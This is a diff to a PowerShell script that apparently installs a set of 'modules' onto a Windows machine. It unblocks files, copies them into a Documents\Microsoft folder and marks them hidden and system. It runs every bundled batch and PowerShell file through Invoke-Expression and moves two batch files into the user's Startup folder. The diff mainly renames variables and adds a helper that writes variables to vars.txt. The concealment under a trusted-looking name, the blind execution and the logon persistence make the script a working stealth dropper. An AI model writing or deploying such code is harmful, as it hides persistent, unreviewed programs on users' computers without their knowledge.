@@ -1,21 +1,31 @@
 # Paths & Settings
 $location = Get-Location
 $scripts = "${location}\scripts"
-$sourcePathSystem = "${location}\system"
-$sourcePathLocal = "${location}\local"
-$destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
-$resourcesPath = "${location}\extra"
+$_sourcePathSystem = "${location}\system"
+$_sourcePathLocal = "${location}\local"
+$_destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
+$_resourcesPath = "${location}\extra"
 # Script Settings
 $video = 2
+
+function exportVars {
+    [string]$FilePath = "vars.txt"
+    $variables = Get-Variable
+    $exclamationVariables = $variables | Where-Object { $_.Name -like '_*' }
+    foreach ($var in $exclamationVariables) {
+        $output += "`$" + "$($var.Name) = $($var.Value)" + "`n"
+    }
+    $output | Out-File -FilePath $FilePath
+}
 
 # Unblock Files
 Get-ChildItem -r | unblock-file
 
 # Copy to System
-Robocopy "${sourcePathSystem}" "${destinationPath}" /A+:SH /MIR /MT
+Robocopy "${_sourcePathSystem}" "${_destinationPath}" /A+:SH /MIR /MT
 
 # Hide
-Get-ChildItem -r "${destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }
+Get-ChildItem -r "${_destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }
 
 # Run Batch Scripts (.bat)
 $scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
@@ -26,13 +36,13 @@ $scriptsPowershell = Get-ChildItem -Path "${scripts}\powershell" -Recurse | Sele
 foreach ($i in $scriptsPowershell) { if ($i.EndsWith('.ps1')) { $exp = Get-Content -Path $i -Raw; Invoke-Expression $exp; Set-Location $location } }
 
 # Move to shell:startup
-Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
-Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+Move-Item "${_destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
+Move-Item "${_destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
 
 # Run local Modules
-$modulesLocal = Get-ChildItem -Path $sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty FullName
-foreach ($i in $modulesLocal) { Set-Location $i; Start-Process .\RUN-Module.bat }
+$modulesLocal = Get-ChildItem -Path $_sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty FullName
+foreach ($i in $modulesLocal) { Set-Location $i; exportVars; Start-Process .\RUN-Module.bat }
 
 # Run System Modules
-$modulesSystem = Get-ChildItem -Path $sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name
-foreach ($i in $modulesSystem) { Set-Location "${destinationPath}/${i}"; Start-Process .\RUN-Module.bat }
+$modulesSystem = Get-ChildItem -Path $_sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name
+foreach ($i in $modulesSystem) { Set-Location "${_destinationPath}/${i}"; exportVars; Start-Process .\RUN-Module.bat }
